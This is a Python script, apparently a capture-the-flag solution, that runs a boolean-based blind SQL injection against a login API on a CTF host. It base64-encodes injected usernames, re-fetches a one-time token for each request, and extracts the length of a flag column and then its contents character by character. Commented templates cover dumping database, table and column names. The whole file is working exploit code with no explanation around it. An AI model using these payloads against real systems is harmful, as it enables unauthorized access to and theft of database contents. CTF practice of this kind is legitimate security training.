py
import requests
import base64
import string


def req (payload):
    session = requests.Session()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    url = "http://tokyo.ctf.protergo.party:10002"
    token = session.get(url+"/api/token", headers=headers).json()['data']['token'] 
    ## SINCE THE TOKEN IS ONE TIME USE THEN WE NEED TO FETCH IT
    data = {
        "username":base64.b64encode(payload.encode()).decode(),
        "password":"YXNk",
        "token":token
    }
    a = session.post(url+"/api/login", headers=headers, data=data)
    return a.json()


brute = string.ascii_letters+"{}_0123456789"
x = 1
tmp = ""
dbname = "laravel"
table = "flag"
column = "fl4g_c0lumn5"
offset = 0
BASE_INJECTION = "' OR 1=(SELECT CASE WHEN ({})=HEX({}) THEN 1 ELSE 2 END); -- "
# SELECT HEX(SUBSTR(DATABASE(), {},1))) GET DB NAME
# SELECT HEX(SUBSTR(TABLE_NAME, {},1)) FROM information_schema.TABLES WHERE TABLE_SCHEMA='{}' LIMIT 1 OFFSET {} GET TABLE NAME
# SELECT HEX(SUBSTR(COLUMN_NAME, {},1)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{}' AND TABLE_NAME='{}' LIMIT 1 OFFSET {offset} # GET COLUMN
# SELECT HEX(SUBSTRING({}, {}, 1)) FROM {} LIMIT 1 OFFSET {} DUMP DATA
injection = "SELECT HEX(LENGTH({})) FROM {} LIMIT 1 OFFSET {}" # DETECTING DATA LENGTH
for i in range(10000):
    if req(BASE_INJECTION.format(injection.format(column, table, offset), f"{i}"))["success"]:
        data_length = i
        print("DATA LENGTH:",data_length)
        break

injection = "SELECT HEX(SUBSTRING({}, {}, 1)) FROM {} LIMIT 1 OFFSET {}"
while x <= data_length:
    for i in brute:
        payload = BASE_INJECTION.format(injection.format(column, x, table, offset), f"'{i}'")
        request = req(payload)
        if request["success"]:
            tmp += i
            print(tmp)
            break
    x+=1
print(tmp)